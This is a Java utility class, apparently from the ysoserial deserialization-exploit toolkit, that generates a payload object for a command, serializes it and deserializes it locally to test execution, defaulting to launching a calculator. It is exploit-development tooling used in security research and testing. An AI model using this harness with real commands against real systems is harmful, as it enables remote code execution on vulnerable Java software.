package ysoserial.payloads.util;

import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.secmgr.ExecCheckingSecurityManager;

import java.util.concurrent.Callable;

/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {

    public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
        // ensure payload generation doesn't throw an exception
        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>() {
            public byte[] call() throws Exception {
                final String command = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();

                System.out.println("generating payload object(s) for command: '" + command + "'");

                ObjectPayload<?> payload = clazz.newInstance();
                final Object objBefore = payload.getObject(command);

                System.out.println("serializing payload");
                byte[] ser = Serializer.serialize(objBefore);
                Utils.releasePayload(payload, objBefore);
                return ser;
            }
        });

        try {
            System.out.println("deserializing payload");
            final Object objAfter = Deserializer.deserialize(serialized);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static String getDefaultTestCmd() {
        String osName = System.getProperty("os.name").toLowerCase();
        if (osName.contains("win")) {
            return "calc.exe";
        } else if (osName.contains("mac")) {
            return "open -a calculator";
        } else {
            // Assume it's a Linux system
            return "/usr/bin/gnome-calculator";
        }
    }

    private static String getFirstExistingFile(String... files) {
        return "calc.exe";
//        for (String path : files) {
//            if (new File(path).exists()) {
//                return path;
//            }
//        }
//        throw new UnsupportedOperationException("no known test executable");
    }
}
